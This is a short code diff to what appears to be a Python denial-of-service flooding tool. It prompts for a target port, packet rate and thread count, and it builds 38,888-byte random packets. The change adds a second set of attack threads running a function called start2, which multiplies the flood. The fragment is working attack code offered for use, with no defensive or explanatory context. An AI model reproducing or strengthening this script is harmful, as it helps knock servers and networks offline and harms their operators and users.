@@ -237,6 +237,7 @@ port = int(input('[+] Port: '))
 pack = int(input('[+] Packet/s: '))
 num_threads = int(input('[+] Threads: '))
 threads = []
+results = []
 def randomip():
   global sock
   sock = random._urandom(38888) 
@@ -349,4 +350,9 @@ for _ in range(num_threads):
     thread.start()
 for thread in threads:
     thread.join()
-    
+for _ in range(num_threads):
+    thread = threading.Thread(target=start2)
+    results.append(thread)
+    thread.start()
+for thread in results:
+    thread.join()
